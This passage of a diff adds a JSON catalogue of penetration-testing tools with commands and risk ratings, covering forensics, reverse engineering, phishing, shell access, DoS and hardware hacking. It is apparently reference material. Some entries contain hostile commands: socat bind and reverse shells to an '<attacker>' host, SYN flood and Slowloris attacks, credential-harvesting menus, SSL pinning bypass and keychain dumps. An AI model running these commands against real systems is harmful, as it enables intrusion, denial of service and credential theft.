+              "cmd": "steghide info image.jpg",
+              "explanation": "Show embedded file info"
+            }
+          ],
+          "use_cases": [
+            "Steganography",
+            "Data hiding",
+            "CTF challenges"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Foremost",
+          "category": "Forensics",
+          "description": "File carving and recovery tool",
+          "installation": "sudo apt install foremost",
+          "syntax": "foremost -i <image> -o <output>",
+          "commands": [
+            {
+              "cmd": "foremost -i disk.img -o recovered/",
+              "explanation": "Recover all file types"
+            },
+            {
+              "cmd": "foremost -t jpg,png -i disk.img -o recovered/",
+              "explanation": "Recover specific types"
+            },
+            {
+              "cmd": "foremost -i /dev/sda -o recovered/",
+              "explanation": "Recover from device"
+            }
+          ],
+          "use_cases": [
+            "File recovery",
+            "Data carving",
+            "Forensic analysis"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "ExifTool",
+          "category": "Forensics",
+          "description": "Metadata reading and writing tool",
+          "installation": "sudo apt install exiftool",
+          "syntax": "exiftool [options] <file>",
+          "commands": [
+            {
+              "cmd": "exiftool image.jpg",
+              "explanation": "View all metadata"
+            },
+            {
+              "cmd": "exiftool -all= image.jpg",
+              "explanation": "Strip all metadata"
+            },
+            {
+              "cmd": "exiftool -GPS* image.jpg",
+              "explanation": "Extract GPS data"
+            }
+          ],
+          "use_cases": [
+            "Metadata analysis",
+            "OSINT",
+            "Evidence examination"
+          ],
+          "risk_level": "Low"
+        }
+      ]
+    },
+    {
+      "name": "Reporting Tools",
+      "tools": [
+        {
+          "name": "CherryTree",
+          "category": "Reporting Tools",
+          "description": "Hierarchical note-taking application",
+          "installation": "sudo apt install cherrytree",
+          "syntax": "cherrytree",
+          "commands": [
+            {
+              "cmd": "cherrytree",
+              "explanation": "Launch application"
+            },
+            {
+              "cmd": "Create nodes for each engagement phase",
+              "explanation": "Organize notes"
+            },
+            {
+              "cmd": "Export as PDF/HTML",
+              "explanation": "Generate reports"
+            }
+          ],
+          "use_cases": [
+            "Pentest documentation",
+            "Note organization",
+            "Report generation"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Pipal",
+          "category": "Reporting Tools",
+          "description": "Password statistics analyzer",
+          "installation": "git clone https://github.com/digininja/pipal.git",
+          "syntax": "ruby pipal.rb <password_file>",
+          "commands": [
+            {
+              "cmd": "ruby pipal.rb passwords.txt",
+              "explanation": "Analyze password list"
+            },
+            {
+              "cmd": "ruby pipal.rb passwords.txt --output report.txt",
+              "explanation": "Save report"
+            },
+            {
+              "cmd": "ruby pipal.rb passwords.txt --top 20",
+              "explanation": "Show top 20 patterns"
+            }
+          ],
+          "use_cases": [
+            "Password analysis",
+            "Security reporting",
+            "Password policy auditing"
+          ],
+          "risk_level": "Low"
+        }
+      ]
+    },
+    {
+      "name": "Reverse Engineering",
+      "tools": [
+        {
+          "name": "Ghidra",
+          "category": "Reverse Engineering",
+          "description": "NSA reverse engineering framework",
+          "installation": "Download from ghidra-sre.org",
+          "syntax": "ghidraRun",
+          "commands": [
+            {
+              "cmd": "ghidraRun",
+              "explanation": "Launch Ghidra GUI"
+            },
+            {
+              "cmd": "Import binary > Auto Analyze",
+              "explanation": "Analyze executable"
+            },
+            {
+              "cmd": "Decompiler window",
+              "explanation": "View decompiled code"
+            }
+          ],
+          "use_cases": [
+            "Binary analysis",
+            "Malware reverse engineering",
+            "Vulnerability research"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Radare2",
+          "category": "Reverse Engineering",
+          "description": "Command-line reverse engineering framework",
+          "installation": "sudo apt install radare2",
+          "syntax": "r2 <binary>",
+          "commands": [
+            {
+              "cmd": "r2 binary",
+              "explanation": "Open binary in r2"
+            },
+            {
+              "cmd": "aaa",
+              "explanation": "Auto-analyze all"
+            },
+            {
+              "cmd": "pdf @main",
+              "explanation": "Disassemble main function"
+            }
+          ],
+          "use_cases": [
+            "Binary analysis",
+            "Exploit development",
+            "CTF challenges"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "GDB",
+          "category": "Reverse Engineering",
+          "description": "GNU Debugger",
+          "installation": "sudo apt install gdb",
+          "syntax": "gdb <binary>",
+          "commands": [
+            {
+              "cmd": "gdb ./binary",
+              "explanation": "Start debugging"
+            },
+            {
+              "cmd": "break main",
+              "explanation": "Set breakpoint at main"
+            },
+            {
+              "cmd": "run",
+              "explanation": "Execute program"
+            },
+            {
+              "cmd": "info registers",
+              "explanation": "View register values"
+            }
+          ],
+          "use_cases": [
+            "Binary debugging",
+            "Exploit development",
+            "Program analysis"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "objdump",
+          "category": "Reverse Engineering",
+          "description": "Object file disassembler",
+          "installation": "sudo apt install binutils",
+          "syntax": "objdump [options] <file>",
+          "commands": [
+            {
+              "cmd": "objdump -d binary",
+              "explanation": "Disassemble executable"
+            },
+            {
+              "cmd": "objdump -x binary",
+              "explanation": "Display all headers"
+            },
+            {
+              "cmd": "objdump -s -j .rodata binary",
+              "explanation": "Dump rodata section"
+            }
+          ],
+          "use_cases": [
+            "Binary disassembly",
+            "Header analysis",
+            "Section inspection"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "strings",
+          "category": "Reverse Engineering",
+          "description": "Extract printable strings from files",
+          "installation": "Pre-installed on Linux",
+          "syntax": "strings <file>",
+          "commands": [
+            {
+              "cmd": "strings binary",
+              "explanation": "Extract all strings"
+            },
+            {
+              "cmd": "strings -n 10 binary",
+              "explanation": "Min 10 char strings"
+            },
+            {
+              "cmd": "strings -e l binary",
+              "explanation": "Extract 16-bit strings"
+            }
+          ],
+          "use_cases": [
+            "String extraction",
+            "Malware analysis",
+            "Binary inspection"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Frida",
+          "category": "Reverse Engineering",
+          "description": "Dynamic instrumentation toolkit",
+          "installation": "pip install frida-tools",
+          "syntax": "frida [options]",
+          "commands": [
+            {
+              "cmd": "frida -U -l script.js com.app",
+              "explanation": "Inject script into app"
+            },
+            {
+              "cmd": "frida-ps -U",
+              "explanation": "List running processes"
+            },
+            {
+              "cmd": "frida-trace -U -i 'open' com.app",
+              "explanation": "Trace function calls"
+            }
+          ],
+          "use_cases": [
+            "Dynamic analysis",
+            "Mobile app testing",
+            "Runtime manipulation"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Objection",
+          "category": "Reverse Engineering",
+          "description": "Runtime mobile exploration toolkit",
+          "installation": "pip install objection",
+          "syntax": "objection [options]",
+          "commands": [
+            {
+              "cmd": "objection -g com.app explore",
+              "explanation": "Attach to mobile app"
+            },
+            {
+              "cmd": "android sslpinning disable",
+              "explanation": "Bypass SSL pinning"
+            },
+            {
+              "cmd": "ios keychain dump",
+              "explanation": "Dump iOS keychain"
+            }
+          ],
+          "use_cases": [
+            "Mobile app pentesting",
+            "SSL pinning bypass",
+            "Runtime analysis"
+          ],
+          "risk_level": "Medium"
+        }
+      ]
+    },
+    {
+      "name": "Social Engineering",
+      "tools": [
+        {
+          "name": "SET",
+          "category": "Social Engineering",
+          "description": "Social Engineering Toolkit",
+          "installation": "sudo apt install set",
+          "syntax": "setoolkit",
+          "commands": [
+            {
+              "cmd": "setoolkit",
+              "explanation": "Launch main menu"
+            },
+            {
+              "cmd": "1 > 2 > 3",
+              "explanation": "Credential harvester"
+            },
+            {
+              "cmd": "1 > 1",
+              "explanation": "Spear phishing attack"
+            }
+          ],
+          "use_cases": [
+            "Phishing attacks",
+            "Credential harvesting",
+            "Social engineering campaigns"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "GoPhish",
+          "category": "Social Engineering",
+          "description": "Phishing campaign framework",
+          "installation": "Download from getgophish.com",
+          "syntax": "./gophish",
+          "commands": [
+            {
+              "cmd": "./gophish",
+              "explanation": "Start GoPhish server"
+            },
+            {
+              "cmd": "Access https://localhost:3333",
+              "explanation": "Open admin panel"
+            },
+            {
+              "cmd": "Create campaign with template",
+              "explanation": "Launch phishing campaign"
+            }
+          ],
+          "use_cases": [
+            "Phishing simulation",
+            "Security awareness testing",
+            "Email campaigns"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "theHarvester",
+          "category": "Social Engineering",
+          "description": "Email and domain OSINT tool",
+          "installation": "sudo apt install theharvester",
+          "syntax": "theHarvester -d <domain> -b <source>",
+          "commands": [
+            {
+              "cmd": "theHarvester -d example.com -b all",
+              "explanation": "Full OSINT harvest"
+            },
+            {
+              "cmd": "theHarvester -d example.com -b google -l 500",
+              "explanation": "Google search 500 results"
+            },
+            {
+              "cmd": "theHarvester -d example.com -b linkedin",
+              "explanation": "LinkedIn harvest"
+            }
+          ],
+          "use_cases": [
+            "Email enumeration",
+            "OSINT gathering",
+            "Target profiling"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Sherlock",
+          "category": "Social Engineering",
+          "description": "Username hunter across social networks",
+          "installation": "git clone https://github.com/sherlock-project/sherlock.git && pip install -r requirements.txt",
+          "syntax": "python3 sherlock.py <username>",
+          "commands": [
+            {
+              "cmd": "python3 sherlock.py johndoe",
+              "explanation": "Search username everywhere"
+            },
+            {
+              "cmd": "python3 sherlock.py johndoe --timeout 10",
+              "explanation": "Set timeout per site"
+            },
+            {
+              "cmd": "python3 sherlock.py johndoe -o results.txt",
+              "explanation": "Save results"
+            }
+          ],
+          "use_cases": [
+            "Username OSINT",
+            "Social media profiling",
+            "Identity verification"
+          ],
+          "risk_level": "Low"
+        }
+      ]
+    },
+    {
+      "name": "Maintaining Access",
+      "tools": [
+        {
+          "name": "Socat",
+          "category": "Maintaining Access",
+          "description": "Multipurpose relay and networking tool",
+          "installation": "sudo apt install socat",
+          "syntax": "socat [options] <address1> <address2>",
+          "commands": [
+            {
+              "cmd": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash",
+              "explanation": "Bind shell"
+            },
+            {
+              "cmd": "socat TCP:<attacker>:4444 EXEC:/bin/bash",
+              "explanation": "Reverse shell"
+            },
+            {
+              "cmd": "socat TCP-LISTEN:8080,fork TCP:<target>:80",
+              "explanation": "Port forwarding"
+            }
+          ],
+          "use_cases": [
+            "Persistent connections",
+            "Port forwarding",
+            "Shell relaying"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "pwncat",
+          "category": "Maintaining Access",
+          "description": "Advanced reverse/bind shell handler",
+          "installation": "pip install pwncat-cs",
+          "syntax": "pwncat-cs [options]",
+          "commands": [
+            {
+              "cmd": "pwncat-cs -lp 4444",
+              "explanation": "Listen for connection"
+            },
+            {
+              "cmd": "pwncat-cs connect://target:4444",
+              "explanation": "Connect to bind shell"
+            },
+            {
+              "cmd": "run enumerate",
+              "explanation": "Auto-enumerate target"
+            }
+          ],
+          "use_cases": [
+            "Shell handling",
+            "Post-exploitation",
+            "Enumeration"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Ligolo-ng",
+          "category": "Maintaining Access",
+          "description": "Tunneling and pivoting tool",
+          "installation": "Download from GitHub releases",
+          "syntax": "./proxy -selfcert",
+          "commands": [
+            {
+              "cmd": "./proxy -selfcert",
+              "explanation": "Start proxy with self-signed cert"
+            },
+            {
+              "cmd": "./agent -connect <attacker>:11601 -ignore-cert",
+              "explanation": "Connect agent"
+            },
+            {
+              "cmd": "session > ifconfig",
+              "explanation": "View target interfaces"
+            }
+          ],
+          "use_cases": [
+            "Network pivoting",
+            "Tunneling",
+            "Lateral movement"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "WireGuard",
+          "category": "Maintaining Access",
+          "description": "Fast modern VPN tunnel",
+          "installation": "sudo apt install wireguard",
+          "syntax": "wg [options]",
+          "commands": [
+            {
+              "cmd": "wg genkey | tee privatekey | wg pubkey > publickey",
+              "explanation": "Generate keys"
+            },
+            {
+              "cmd": "wg-quick up wg0",
+              "explanation": "Start VPN tunnel"
+            },
+            {
+              "cmd": "wg show",
+              "explanation": "Display connection status"
+            }
+          ],
+          "use_cases": [
+            "Persistent VPN tunnels",
+            "Secure communication",
+            "Network pivoting"
+          ],
+          "risk_level": "Low"
+        }
+      ]
+    },
+    {
+      "name": "Stress Testing",
+      "tools": [
+        {
+          "name": "hping3",
+          "category": "Stress Testing",
+          "description": "TCP/IP packet assembler and analyzer",
+          "installation": "sudo apt install hping3",
+          "syntax": "hping3 [options] <target>",
+          "commands": [
+            {
+              "cmd": "hping3 -S --flood -p 80 <target>",
+              "explanation": "SYN flood attack"
+            },
+            {
+              "cmd": "hping3 -1 <target>",
+              "explanation": "ICMP mode ping"
+            },
+            {
+              "cmd": "hping3 -S -p 80 --tcp-timestamp <target>",
+              "explanation": "TCP timestamp probe"
+            }
+          ],
+          "use_cases": [
+            "DoS testing",
+            "Firewall testing",
+            "Network probing"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Slowloris",
+          "category": "Stress Testing",
+          "description": "Low-bandwidth DoS tool",
+          "installation": "git clone https://github.com/gkbrk/slowloris.git",
+          "syntax": "python3 slowloris.py <target>",
+          "commands": [
+            {
+              "cmd": "python3 slowloris.py example.com",
+              "explanation": "Launch Slowloris attack"
+            },
+            {
+              "cmd": "python3 slowloris.py example.com -p 8080",
+              "explanation": "Target specific port"
+            },
+            {
+              "cmd": "python3 slowloris.py example.com -s 500",
+              "explanation": "Set 500 sockets"
+            }
+          ],
+          "use_cases": [
+            "HTTP DoS testing",
+            "Server resilience testing",
+            "Resource exhaustion testing"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "GoldenEye",
+          "category": "Stress Testing",
+          "description": "HTTP DoS test tool",
+          "installation": "git clone https://github.com/jseidl/GoldenEye.git",
+          "syntax": "python3 goldeneye.py <URL>",
+          "commands": [
+            {
+              "cmd": "python3 goldeneye.py http://target.com",
+              "explanation": "Launch DoS test"
+            },
+            {
+              "cmd": "python3 goldeneye.py http://target.com -w 50",
+              "explanation": "Set 50 workers"
+            },
+            {
+              "cmd": "python3 goldeneye.py http://target.com -s randuseragent",
+              "explanation": "Random user agents"
+            }
+          ],
+          "use_cases": [
+            "HTTP load testing",
+            "Server stress testing",
+            "DoS simulation"
+          ],
+          "risk_level": "High"
+        }
+      ]
+    },
+    {
+      "name": "Hardware Hacking",
+      "tools": [
+        {
+          "name": "Arduino",
+          "category": "Hardware Hacking",
+          "description": "Open-source electronics platform",
+          "installation": "sudo apt install arduino",
+          "syntax": "arduino (GUI IDE)",
+          "commands": [
+            {
+              "cmd": "arduino",
+              "explanation": "Launch Arduino IDE"
+            },
+            {
+              "cmd": "arduino --upload sketch.ino --port /dev/ttyUSB0",
+              "explanation": "Upload sketch"
+            },
+            {
+              "cmd": "arduino-cli compile --fqbn arduino:avr:uno sketch/",
+              "explanation": "CLI compile"
+            }
+          ],
+          "use_cases": [
+            "Hardware prototyping",
+            "BadUSB attacks",
+            "IoT security testing"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "flashrom",
+          "category": "Hardware Hacking",
+          "description": "Flash chip programmer",
+          "installation": "sudo apt install flashrom",
+          "syntax": "flashrom [options]",
+          "commands": [
+            {
+              "cmd": "flashrom -p internal",
+              "explanation": "Detect internal flash chip"
+            },
+            {
+              "cmd": "flashrom -p internal -r backup.bin",
+              "explanation": "Read firmware dump"
+            },
+            {
+              "cmd": "flashrom -p internal -w modified.bin",
+              "explanation": "Write modified firmware"
+            }
+          ],
+          "use_cases": [
+            "Firmware dumping",
+            "BIOS modification",
+            "Hardware security testing"
+          ],
+          "risk_level": "Medium"
+        }
+      ]
+    }
+  ]
+}
